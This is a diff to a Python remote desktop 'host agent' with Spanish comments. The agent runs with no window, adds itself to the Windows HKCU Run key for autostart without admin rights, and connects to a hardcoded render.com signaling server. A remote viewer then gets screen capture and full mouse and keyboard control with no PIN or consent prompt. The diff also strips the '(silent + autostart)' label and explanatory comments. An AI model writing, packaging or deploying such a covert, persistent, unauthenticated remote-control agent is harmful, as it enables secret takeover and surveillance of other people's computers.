@@ -1,20 +1,21 @@
 """
-Remote Desktop — Host Agent (silent + autostart)
-=================================================
+Remote Desktop — Host Agent
+============================
 - Corre sin ventana ni consola.
-- Al primer arranque se registra en el inicio de Windows (sin admin).
-- El viewer se conecta directo, sin PIN.
+- Se registra en el inicio de Windows automáticamente.
+- El viewer se conecta directo sin PIN.
 - Log en: %LOCALAPPDATA%\\RemoteDesktopHost\\host.log
 
 Build:
-    pip install pyinstaller aiortc mss pyautogui python-socketio aiohttp pillow numpy av
-    pyinstaller --onefile --noconsole --name RemoteDesktopHost host_agent.py
+    pip install pyinstaller aiortc mss pyautogui python-socketio aiohttp pillow numpy av websocket-client
+    python -m PyInstaller --onefile --noconsole --name RemoteDesktopHost --hidden-import engineio.async_drivers.aiohttp --hidden-import aiohttp --hidden-import socketio.async_client host_agent.py
 """
 
 import asyncio
 import logging
 import pathlib
 import sys
+import traceback
 
 import mss
 import pyautogui
@@ -25,13 +26,13 @@ from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack
 from av import VideoFrame
 
 # ── Config ────────────────────────────────────────────────────────────────────
-SIGNAL_URL = "https://remoto-6lit.onrender.com"   # <-- reemplazar
+SIGNAL_URL = "https://remoto-6lit.onrender.com"
 APP_NAME   = "RemoteDesktopHost"
 FPS        = 20
 pyautogui.FAILSAFE = False
 pyautogui.PAUSE    = 0
 
-# ── Log a archivo (sin consola) ───────────────────────────────────────────────
+# ── Log ───────────────────────────────────────────────────────────────────────
 LOG_PATH = pathlib.Path.home() / "AppData" / "Local" / APP_NAME / "host.log"
 LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
 
@@ -46,35 +47,23 @@ logging.getLogger("aiortc").setLevel(logging.WARNING)
 logging.getLogger("aioice").setLevel(logging.WARNING)
 
 
-# ── Autostart via registro de Windows ────────────────────────────────────────
+# ── Autostart ─────────────────────────────────────────────────────────────────
 def register_autostart():
-    """
-    Agrega el .exe al registro de Windows (HKCU) para que arranque con el
-    sistema sin necesitar permisos de administrador.
-    Se ejecuta solo en Windows; se ignora en otros OS.
-    """
     if sys.platform != "win32":
         return
-
     try:
         import winreg
-
-        # Ruta del ejecutable: sys.executable si es .py, sys.argv[0] si es .exe
         exe_path = str(
             pathlib.Path(
                 sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
             ).resolve()
         )
-
-        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
-            reg_path,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
             0,
             winreg.KEY_READ | winreg.KEY_WRITE,
         )
-
-        # Verificar si ya está registrado con el mismo path
         try:
             current, _ = winreg.QueryValueEx(key, APP_NAME)
         except FileNotFoundError:
@@ -85,9 +74,7 @@ def register_autostart():
             log.info(f"Autostart registrado: {exe_path}")
         else:
             log.info("Autostart ya estaba configurado.")
-
         winreg.CloseKey(key)
-
     except Exception as e:
         log.warning(f"No se pudo registrar autostart: {e}")
 
@@ -171,7 +158,16 @@ def _resolve_key(data):
 # ── Main ──────────────────────────────────────────────────────────────────────
 async def run():
     pc  = None
-    sio = socketio.AsyncClient(reconnection=True, reconnection_attempts=10)
+    sio = socketio.AsyncClient(
+        logger=True,
+        reconnection=True,
+        reconnection_attempts=10,
+        reconnection_delay=3,
+    )
+
+    # Redirigir logs de socketio al mismo archivo
+    sio_log = logging.getLogger("socketio")
+    sio_log.setLevel(logging.DEBUG)
 
     @sio.event
     async def connect():
@@ -243,14 +239,19 @@ async def run():
 
     @sio.on("error")
     async def on_error(data):
-        log.error(f"Error: {data.get('message')}")
+        log.error(f"Error del servidor: {data.get('message')}")
 
     try:
-        await sio.connect(SIGNAL_URL, transports=["polling", "websocket"])
+        log.info(f"Conectando a {SIGNAL_URL} …")
+        await sio.connect(
+            SIGNAL_URL,
+            transports=["polling", "websocket"],
+            wait_timeout=30,
+        )
+        log.info("Conexión establecida, esperando viewer…")
         await sio.wait()
     except Exception as e:
-        import traceback
-        log.error(f"Conexión fallida: {e}")
+        log.error(f"Conexión fallida: {type(e).__name__}: {e}")
         log.error(traceback.format_exc())
     finally:
         if pc: await pc.close()
@@ -259,11 +260,9 @@ async def run():
 
 # ── Entry point ───────────────────────────────────────────────────────────────
 if __name__ == "__main__":
-    # 1. Registrar autostart en Windows (solo la primera vez o si cambió de lugar)
     register_autostart()
-
-    # 2. Arrancar el agente
     try:
         asyncio.run(run())
     except Exception as e:
-        log.error(f"Error fatal: {e}")
+        log.error(f"Error fatal: {type(e).__name__}: {e}")
+        log.error(traceback.format_exc())
